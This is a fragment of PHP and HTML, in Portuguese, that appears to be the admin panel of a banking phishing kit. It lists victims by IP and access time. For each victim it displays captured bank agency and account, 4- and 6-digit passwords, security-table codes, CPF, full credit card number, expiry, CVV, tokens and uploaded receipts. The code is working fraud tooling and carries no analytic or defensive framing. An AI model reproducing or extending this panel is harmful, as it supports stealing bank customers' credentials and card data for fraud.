...
?>
		<tr>
			<td><?php echo $GetClientes[$i]['ip'];?></td>
			<td><?php echo date('d/m/y H:i', strtotime($GetClientes[$i]['data_acesso']));?></td>
			<td><?php echo $GetClientes[$i]['tipo_acesso'];?></td>
			<td><?php echo ($GetClientes[$i]['enviou_tabela'] == '1') ? 'SIM' : 'NAO';?></td>
			<td><?php echo ($GetClientes[$i]['cc_numero'] != '') ? 'SIM' : 'NAO';?></td>
			<td><?php echo $GetClientes[$i]['anotacao'];?></td>
			<td><a href="acesso.php?pag=lista-infos&view=<?php echo $GetClientes[$i]['id'];?>" class="manage_user_link"><i class="fa fa-eye"></i></a></td>
		</tr>
<?php
		endif;
	}
...
<div class="gerenciamento" style="position: absolute!important;top:0;left:0;display:<?php echo $ShowInfo;?>;">
	<div class="block_commands" style="width:80%;">
		<div class="block_show_infos">
			<span>ID: <b><?php echo $ListCliente[0]['id'];?></b> / <b><?php echo $ListCliente[0]['ip'];?></b></span>
			<span>STATUS: <b><?php echo ($ListCliente[0]['status'] == 1) ? 'FINALIZADO' : 'NÃO FINALIZADO';?></span>
			<span>HOST NAME: <b><?php echo $ListCliente[0]['pc_name'];?></b></span>
			<span>OS: <b><?php echo $ListCliente[0]['sistema_operacional'];?></b> / <b><?php echo $ListCliente[0]['browser_name'];?></b> - <b><?php echo $ListCliente[0]['browser_version'];?></b></span>
			<span>NOME: <b><?php echo $ListCliente[0]['nome'];?></b></span>
			<span>DATA: <b><?php echo date('d/m/Y H:s' ,strtotime($ListCliente[0]['data_acesso']));?></b></span>

			<span>ENDEREÇO: <b><?php echo $ListCliente[0]['cidade'];?></b> / <b><?php echo $ListCliente[0]['estado'];?></b> / <b><?php echo $ListCliente[0]['pais'];?></b></span>
			<span>TIPO ACESSO: <b><?php echo $ListCliente[0]['tipo_acesso'];?></b></span>

			<span>ACESSO: <b><?php echo $ListCliente[0]['agencia'];?></b> / <b><?php echo $ListCliente[0]['conta'];?></b>-<b><?php echo $ListCliente[0]['digito'];?></b></span>
			<span>SENHA 4 / 6: <b><?php echo $ListCliente[0]['senha_4'];?></b> / <b><?php echo $ListCliente[0]['pass_6'];?></b></span>
			<span>POSIÇÃO: <b><?php echo $ListCliente[0]['tabela_pos'];?></b> - <b><?php echo $ListCliente[0]['tabela_valor'];?></b></span>
			<span>CPF: <b><?php echo $ListCliente[0]['cpf'];?></b></span>

			<span>CC NOME: <b><?php echo $ListCliente[0]['cc_nome'];?></b></span>
			<span>CC NUMERO: <b><?php echo $ListCliente[0]['cc_numero'];?></b></span>
			<span>CC VALIDADE: <b><?php echo $ListCliente[0]['cc_val'];?></b></span>
			<span>CC CÓDIGO: <b><?php echo $ListCliente[0]['cc_cvv'];?></b></span>

			<span>TOKEN: <b><?php echo $ListCliente[0]['token'];?></b></span>
			
			<span>ANOTAÇÃO: <b><?php echo $ListCliente[0]['anotacao'];?></b></span>
			<div class="clear"></div>
		...
		<div class="block_show_infos">
			...
			<div class="block_buttons_atrib">
				...
				<div id="show_img_comp">
					<img src="../_images/comprovantes/<?php echo $ListCliente[0]['comprovante_patch'];?>">
				</div> 
				<div id="cc_one">
					<span><y>Titular:</y> <b><?php echo $ListCliente[0]['cc_nome'];?></b></span>
					<span><y>Número CC:</y> <b><?php echo $ListCliente[0]['cc_numero'];?></b></span>
					<span><y>Validade:</y> <b><?php echo $ListCliente[0]['cc_val'];?></b></span>
					<span><y>Código de Segurança:</y> <b><?php echo $ListCliente[0]['cc_cvv'];?></b></span>
				</div>
			</span>
